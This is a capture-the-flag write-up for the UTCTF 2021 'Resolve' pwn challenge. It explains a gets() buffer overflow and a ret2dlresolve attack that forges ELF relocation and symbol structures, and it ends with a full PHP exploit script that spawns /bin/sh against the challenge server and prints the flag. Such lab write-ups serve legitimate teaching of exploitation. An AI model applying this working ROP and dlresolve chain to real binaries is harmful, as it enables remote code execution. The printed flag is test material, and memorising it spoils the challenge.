# Resolve - UTCTF 2021 (pwn, 980p, 46 solved)

## Introduction
Resolve is a binary exploitation task.

An x64 ELF binary is given. This binary does not print anything and waits for
user input. Unsurprisingly, inputting a large string of characters causes the
program to crash.

## Reverse engineering
The binary calls `gets` on a buffer of size 8.  
That's it. Nothing less, nothing more.

## Vulnerabilities
The `gets` function is inherently insecure: it will overwrite buffers of any
size. This challenge is vulnerable to the most basic case of stack-based buffer
overflow.

## Exploitation
The binary is not compiled with a PIE. It is possible to leverage the call to
`gets` to start a ROP chain. Unfortunately, there is not enough interesting
gadgets in this tiny binary.

The binary is compiled with lazy relocations (the call to `gets` is resolved
just in time).

It is possible to return to the `dlresolve` function and make the binary resolve
a function it is not supposed to resolve.

`dlresolve` is a function that calls a function referenced by an index in an
array of `ElfN_Rela` structures located in the `.rela.plt` section. The index is
pushed in the stack.

```c
typedef struct {
    Elf32_Addr r_offset;
    uint32_t   r_info;
    int32_t    r_addend;
} Elf32_Rela;

typedef struct {
    Elf64_Addr r_offset;
    uint64_t   r_info;
    int64_t    r_addend;
} Elf64_Rela;
```

It writes the relocated address in at address `r_offset` and jumps to it.

It knows what function to relocate by looking up an `ElfN_Sym` structure in the
array located in the `.dynsym` section. The index is stored within the `r_info`
member of the structure.

```c
typedef struct {
    uint32_t      st_name;
    Elf32_Addr    st_value;
    uint32_t      st_size;
    unsigned char st_info;
    unsigned char st_other;
    uint16_t      st_shndx;
} Elf32_Sym;

typedef struct {
    uint32_t      st_name;
    unsigned char st_info;
    unsigned char st_other;
    uint16_t      st_shndx;
    Elf64_Addr    st_value;
    uint64_t      st_size;
} Elf64_Sym;
```

In the end, `dlresolv` retrieves the name of the function to resolve by looking
at the string located at `.dynstr` + `st_name`.

None of these structures are present in the original binary. It is required to
forge them to carry the attack. A good place to store these structures is the
BSS.

The `Elf64_Rela` structure can be located at `0x00404040` (offset 635).  
The `Elf64_Sym` structure can be located at `0x00404068` (offset 647).  
The function name can be put anywhere because it has no alignment requirements.

The exploit below calls `gets` to store the structures at the rights addresses,
than resolves `execl` by calling `dlresolv`.

**Flag**: `utflag{2_linker_problems_in_one_ctf?8079235}`

## Appendices
### pwn.php
```php
#!/usr/bin/php
<?php // vim: filetype=php
require_once "Process.php";
require_once "Socket.php";

const POPRDI = 0x004011c3;
const GETS   = 0x00401040;
const RESOLV = 0x00401020;

/* segments */
const RELA   = 0x004004b8;
const DYNSYM = 0x004003c0;
const DYNSTR = 0x00400420;


$addr = 0x00404040;
assert(0 === ($addr - RELA) % 0x18);
assert(0 === ($addr + 0x28 - DYNSYM) % 0x18);


$ROP = pack("Q*",
	/* Write second payload */
	POPRDI, $addr,
	GETS,

	/* Call execl */
	POPRDI, $addr + 0x18 + 0x10 + 0x18,
	RESOLV, (int)(($addr - RELA) / 0x18),
);

// rela.plt
$payload = pack("QVVQ",
	$addr, // offset
	7, // info
	(int)(($addr + 0x18 + 0x10 - DYNSYM) / 0x18), // info
	0, // addend
);
$payload .= str_pad("execl", 0x10, "\x00");

$payload .= pack("VCCvQQ",
	$addr + 0x18 - DYNSTR, // name
	0, // info
	0, // other
	0, // shndx
	0, // value
	0, // size
);

$payload .= "/bin/sh\0";
$final = sprintf("%016d%s\n%s\n", 0, $ROP, $payload);

const LOCAL = false;
const HOST  = "pwn.utctf.live";
const PORT  = 5435;

printf("[*] Creating process\n");
$time = microtime(true);

if(LOCAL)
	$t = new Process("./resolve");
else
	$t = new SocketTube(HOST, PORT);

printf("[+] Done in %f seconds\n", microtime(true) - $time);
printf("\n");

$t->write($final);

$t->pipe();
```
